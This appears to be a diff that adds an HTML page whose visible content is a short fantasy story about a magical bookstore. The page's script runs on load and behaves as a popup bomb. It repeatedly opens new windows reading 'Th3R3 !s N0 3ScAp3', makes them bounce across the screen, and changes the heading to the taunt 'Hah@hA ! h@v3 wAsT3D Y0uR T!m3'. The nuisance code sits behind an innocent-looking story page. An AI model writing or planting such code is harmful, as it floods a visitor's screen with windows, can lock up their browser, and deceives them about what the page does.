@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1 id="title">In the heart of the city, nestled between towering skyscrapers, there was an unassuming little bookstore that seemed to exist in its own time bubble. The sign above the door read "Whispers of the Past," and as soon as you stepped inside, the scent of aged paper and leather embraced you. But this wasn't just any bookstore. Legend had it that once a decade, on a night when the moon was full and shrouded in mist, the bookstore would choose a reader for an extraordinary adventure. Mia, a curious young woman with a penchant for mysteries, had always felt an inexplicable pull towards the shop. On the night of the mist-covered full moon, she found herself drawn to a book that seemed to glow with an otherworldly light. The title read "The Chronicles of the Forgotten Realm." As she opened the book, the pages turned on their own, revealing an ancient map with a cryptic message: "He who deciphers the secrets of the past shall uncover the fate of the future." Suddenly, the ground trembled, and a soft whisper filled the air. The words on the map began to shimmer, and Mia felt herself being pulled into the pages. In an instant, she was transported to a world long forgotten, a realm where mythical creatures roamed and ancient prophecies awaited their champions. Her heart raced with a mix of fear and excitement—what secrets would she uncover, and what destiny awaited her in this mysterious land?</h1>
+<script>
+function openAndMoveWindow() {
+  let oopen = window.open("", "", "width=400,height=200");
+  oopen.document.write('<h1 id="title"> Th3R3 !s N0 3ScAp3</h1>');
+  let windowX = screen.width / 2 - 200;
+  let windowY = screen.height / 2 - 100;
+  let vx = Math.random() * 200 - 100;
+  let vy = Math.random() * 200 - 100;
+
+  function moveWindow() {
+    windowX += vx;
+    windowY += vy;
+    if (windowX <= 0 || windowX >= screen.width - 400) {
+      vx = -vx;
+      windowX = Math.max(0, Math.min(screen.width - 400, windowX));
+    }
+    if (windowY <= 0 || windowY >= screen.height - 200) {
+      vy = -vy;
+      windowY = Math.max(0, Math.min(screen.height - 200, windowY));
+    }
+    oopen.moveTo(windowX, windowY);
+    setTimeout(moveWindow, 20);
+  }
+
+  moveWindow();
+}
+
+function start() {
+  document.getElementById("title").innerText = "Th3R3 !s N0 3ScAp3";
+  openAndMoveWindow();
+  setInterval(openAndMoveWindow, 2000);
+}
+
+function start1() {
+  document.getElementById("title").innerText = "Hah@hA ! h@v3 wAsT3D Y0uR T!m3";
+}
+
+setInterval(start1, 10000);
+setInterval(start, 3000);
+</script>
+</body>
+</html>
